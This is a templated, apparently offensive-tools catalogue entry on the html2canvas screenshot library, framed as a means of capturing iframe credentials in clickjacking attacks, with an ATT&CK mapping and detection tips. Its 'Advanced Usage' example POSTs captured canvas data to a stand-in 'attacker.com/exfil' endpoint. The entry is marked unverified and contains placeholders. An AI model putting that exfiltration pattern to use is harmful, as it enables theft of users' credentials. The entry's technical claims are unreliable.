---
url: 'https://html2canvas.hertzen.com/'
tags:
  - javascript
  - capture
  - exfiltration
type: tool
platforms:
  - Web
description: >-
  JavaScript library for capturing HTML elements as canvas images, used here to
  screenshot iframe contents for credential logging in clickjacking attacks.
id: 941637d7-178e-4a65-85c8-3746de306544
created_at: '2025-12-14T17:28:05.378Z'
updated_at: '2025-12-14T17:28:05.378Z'
verified: false
validated: true
submitted: true
---
# html2canvas

**Status**: Unverified

## Overview

html2canvas is a JavaScript library that renders HTML elements as canvas images, commonly used in security testing to capture dynamic content like forms in iframes for analysis or exfiltration during attacks such as clickjacking.

## Description

In offensive operations, html2canvas enables attackers to screenshot obscured or iframed elements without direct DOM access, facilitating credential theft by converting visual inputs to data that can be logged or sent remotely. It's loaded via CDN and targets specific selectors for capture.

## Features

- Feature 1: Renders complex HTML/CSS to canvas, including pseudo-elements
- Feature 2: Supports cross-origin iframes with workarounds
- Feature 3: Asynchronous capture for periodic logging

## Installation

### Requirements

- Modern web browser
- JavaScript environment

### Install Commands

```html
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
```

## Basic Usage

```javascript
html2canvas(document.querySelector('#capture')).then(canvas => {
  console.log(canvas.toDataURL());
});
```

### Common Options

| Option | Description |
|--------|-------------|
| `allowTaint` | true/false - Allow cross-origin images |
| `useCORS` | true/false - Enable CORS for tainted canvases |
| `scale` | Number - Rendering scale factor |

## Examples

### Example 1: Basic Usage

```javascript
html2canvas(document.body).then(canvas => {
  document.body.appendChild(canvas);
});
```

### Example 2: Advanced Usage

```javascript
html2canvas(document.querySelector('iframe'), {scale: 2}).then(canvas => {
  fetch('https://attacker.com/exfil', {method: 'POST', body: canvas.toDataURL()});
});
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Tactics

- [[Credential Access]]
- [[Initial Access]]

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor for html2canvas script loads from CDNs in web traffic
- Detect canvas.toDataURL() calls or unusual fetch POSTs with base64 data
- Browser extensions like uBlock can block known malicious libraries

## Related Procedures


## Related Tools

- [[Related Tool 1]]
- [[Related Tool 2]]

## References

- Official documentation: https://html2canvas.hertzen.com/documentation
- Related resources: MDN Canvas API docs
